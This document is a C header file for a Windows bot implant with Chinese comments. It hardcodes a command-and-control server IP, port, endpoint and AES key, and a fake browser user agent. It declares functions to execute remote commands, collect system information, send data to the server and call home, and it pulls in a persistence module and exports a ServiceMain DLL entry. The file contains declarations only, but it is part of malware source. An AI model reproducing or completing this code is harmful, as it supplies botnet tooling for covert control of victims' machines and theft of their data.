#ifndef BOT_H
#define BOT_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <psapi.h>
#include <jansson.h>
#include "../comm/crypto.h"
#include "../comm/net_util.h"
#include "./persistence.h"



#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_PORT 8443
#define C2_IP "172.20.10.3"     // C2服务器IP
#define API_ENDPOINT "/api/v1"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
#define BOT_ID_SIZE 64
#define MAX_RESPONSE 32768
#define BUFFER_SIZE 4096
// 启用调试输出 (设置为1启用，0禁用)
#define DEBUG_MODE 0
#define AES_KEY "2B7E151628AED2A6ABF7158809CF4F3C"





// 全局变量
extern char bot_id[BOT_ID_SIZE];

// utils.c
void generate_bot_id();

// command.c
char* execute_command(const char *cmd);
void parse_and_execute_command(const char *response_body);

// sysinfo.c
char* collect_system_info();

// network.c
int send_data_to_server(const char *host, int port, const char *data);
void call_home(int* success_flag);

#define MAX_CACHED_COMMANDS 10

// 命令缓存结构
typedef struct {
    char *command;
    time_t timestamp;
} CachedCommand;

extern CachedCommand command_cache[MAX_CACHED_COMMANDS];
extern int command_cache_count;

// 缓存管理函数
void cache_command(const char *cmd);
char* get_cached_command();
void free_command_cache();

char* clean_command_output(const char* output);

typedef struct {
    uint8_t* data;
    size_t len;
} EncryptedData;

#ifdef __cplusplus
extern "C" {
#endif

// DLL 入口函数声明
__declspec(dllexport) void WINAPI ServiceMain(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

#ifdef __cplusplus
}
#endif

#endif // BOT_H
